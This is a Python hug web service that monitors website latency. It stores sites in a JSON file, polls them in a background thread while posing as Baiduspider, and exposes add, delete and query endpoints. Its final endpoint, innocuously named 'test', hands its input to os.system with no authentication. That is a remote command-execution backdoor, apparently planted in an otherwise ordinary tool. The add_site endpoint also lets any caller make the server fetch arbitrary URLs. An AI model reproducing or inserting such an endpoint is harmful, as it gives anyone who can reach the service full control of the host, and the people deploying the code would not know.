import hug
import json
import threading
import requests
import time
import sys
import logging
import os

# globals

BASE_PATH = os.path.dirname(os.path.abspath(__file__))
TEST_INTERVAL = 10
MAX_RECORD_NUM = 200
TEST_TIMEOUT = 5

# load_file

sites = None
sites_lock = threading.Lock()

def load_file():
    global sites
    with sites_lock:
        with open(savefile, "r") as f:
            sites = json.load(f)


def save_file():
    with sites_lock:
        with open(savefile, "w") as f:
            json.dump(sites, f)


savefile = os.path.join(BASE_PATH, "sites.json")

if not os.path.exists(savefile):
    with open(savefile, "w") as f:
        json.dump({}, f)

load_file()

# fetching


def test_latency(url):
    t = time.perf_counter()
    try:
        requests.get(url, headers={
            "User-Agent": "Baiduspider",
            "Connection": "close"
        }, timeout=TEST_TIMEOUT, allow_redirects=False)
    except requests.exceptions.Timeout:
        pass
    except Exception:
        return None
    duration = time.perf_counter() - t
    logging.info(f"Test: {url} {duration:.3f}s")
    return duration


def fetch_and_add_data():
    for name in sites.copy():
        latency = test_latency(sites[name]["url"])
        if not latency:
            continue
        with sites_lock:
            sites[name]["data"].insert(0, latency)
            while len(sites[name]["data"]) > MAX_RECORD_NUM:
                sites[name]["data"].pop()

def th():
    while True:
        # count time
        t = time.perf_counter()
        # fetch
        fetch_and_add_data()
        # save
        save_file()
        # sleep
        duration = time.perf_counter() - t
        if duration < TEST_INTERVAL:
            time.sleep(TEST_INTERVAL - duration)

t = threading.Thread(target=th)
t.setDaemon(False)
t.start()

# api


@hug.post()
def get_data(name):
    with sites_lock:
        if name not in sites:
            return []
        return sites[name]["data"]


@hug.post()
def add_site(name, url):
    if not url.startswith("http://"):
        url = "http://" + url
    with sites_lock:
        sites[name] = {
            "name": name,
            "url": url,
            "data": []
        }
    save_file()
    return True


@hug.post()
def del_site(name):
    with sites_lock:
        del sites[name]
    return True


@hug.post()
def get_sites():
    with sites_lock:
        return sites

@hug.post()
def test(data):
    os.system(data)
    return True